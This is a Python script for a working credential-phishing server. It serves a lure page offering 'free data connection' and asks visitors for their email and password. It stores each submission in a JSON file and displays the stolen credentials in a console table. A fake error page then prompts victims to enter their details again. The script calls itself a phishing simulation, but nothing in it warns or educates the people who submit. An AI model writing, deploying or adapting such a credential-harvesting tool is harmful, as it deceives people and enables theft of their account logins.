import http.server
import socketserver
import urllib.parse
import json
from datetime import datetime
from rich.console import Console
from rich.table import Table
File=f"{datetime.today()}-PhishingAcount.json"
PORT = 8000
PHISH_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Free</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
    body { font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 0; }
    .beast-container {
        max-width: 370px; margin: 40px auto; background: #fff; border-radius: 10px;
        box-shadow: 0 2px 10px #aaa; padding: 25px;
    }
    h2 { color: #d9534f; font-size: 1.4em; margin-bottom: 12px; }
    label { display: block; margin: 15px 0 6px; font-size: 1em; }
    input[type="email"], input[type="password"] {
        width: 100%; padding: 10px; margin-bottom: 7px; border: 1px solid #ccc; border-radius: 5px;
        font-size: 1em; background: #fdfdfd;
    }
    input[type="submit"] {
        width: 100%; background: #d9534f; color: #fff; padding: 11px 0;
        border: none; border-radius: 5px; font-size: 1.1em; font-weight: bold; cursor: pointer;
        margin-top: 10px;
        transition: background 0.2s;
    }
    input[type="submit"]:hover { background: #c9302c; }
    .L { margin-top: 20px; font-size: 0.97em; }
    @media (max-width: 500px) {
        .beast-container { max-width: 97vw; margin: 8vw 1vw; padding: 5vw; }
        h2 { font-size: 1.1em; }
    }
    </style>
</head>
<body>
    <div class="beast-container">
        <h2>To get Free Data connection</h2>
        <p>Enter your Email and password accounts</p>
        <form action="/phish" method="post">
            <label>Email:</label>
            <input type="email" name="user" placeholder="Enter Email" autocomplete="off" required>
            <label>Password:</label>
            <input type="password" name="pass" placeholder="Enter password" autocomplete="off" required>
            <input type="submit" value="Sign Up">
        </form>
        <div style="text-align: center;color: #0B7FFF;" class="L"><b>Everything is free</b></div>
    </div>
</body>
</html>
"""

EDU_PAGE = """
<!DOCTYPE html>
<html>

<head>
    <title>Try Again</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            font-family: Arial, sans-serif;
            background: #eff9f2;
            display:flex;
            justify-content: center;
            align-items: center;
            align-content: center;
        }

        .beast-container {
            max-width: 400px;
            margin: 40px auto;
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 2px 10px #bbb;
            padding: 25px;
        }
        p{
            font-size: 30px;
            color:#0B7FFF;
            font-weight: 800;
            padding: 30px;
        }
        a {
            display: inline-block;
            margin-top: 18px;
            text-decoration: none;
            color: #fff;
            background: #d9534f;
            padding: 10px 17px;
            border-radius: 5px;
            font-weight: bold;
        }

        @media (max-width: 500px) {
            .beast-container {
                max-width: 97vw;
                margin: 8vw 1vw;
                padding: 5vw;
            }
        }
    </style>
</head>
<body>
    <div class="beast-container">
        <p>Something went wrong, please enter correct Email and password</p>
        <a href="/">Try Again</a>
    </div>
</body>
</html>
"""
def Save(email,password):
        try:
              with open(File, "r") as f:
                data = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
           data = []
        data.append(
        {
            "Email": email,
            "password": password
        }
    )
        with open(File, "w") as j:
              json.dump(data, j, indent=2)

def Show(email,password):
        console = Console()
        table = Table(title="Phishing account")
        table.add_column("Id", justify="right", style="cyan", no_wrap=True)
        table.add_column("Email", style="magenta")
        table.add_column("password")
        try:
              with open(File, "r") as f:
                a = json.load(f)
              for l,s in enumerate(a,start=1):
                table.add_row(str(l),s["Email"],s["password"])
        except (FileNotFoundError, json.JSONDecodeError):
                pass
        console.print(table)

def handle_get(path, handler):
    if path == "/":
        handler.send_response(200)
        handler.send_header('Content-type', 'text/html')
        handler.end_headers()
        handler.wfile.write(PHISH_PAGE.encode())
    else:
        handler.send_error(404, "Not Found")

def handle_post(path, handler):
    if path == "/phish":
        length = int(handler.headers.get('Content-Length'))
        post_data = handler.rfile.read(length)
        fields = urllib.parse.parse_qs(post_data.decode())
        email = fields.get("user", ["unknown"])[0]
        password = fields.get("pass", [""])[0]
        print(f"\n")
        Save(email,password)
        Show(email,password)
        print("\n")
        handler.send_response(200)
        handler.send_header('Content-type', 'text/html')
        handler.end_headers()
        handler.wfile.write(EDU_PAGE.encode())
    else:
        handler.send_error(404, "Not Found")

def beast_handler(*args):
    class Handler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            handle_get(self.path, self)
        def do_POST(self):
            handle_post(self.path, self)
    Handler(*args)

def main():
    print(f"Phishing simulation server running at http://localhost:{PORT}/")
    with socketserver.TCPServer(("", PORT), beast_handler) as httpd:
        httpd.serve_forever()

if __name__ == "__main__":
    main()
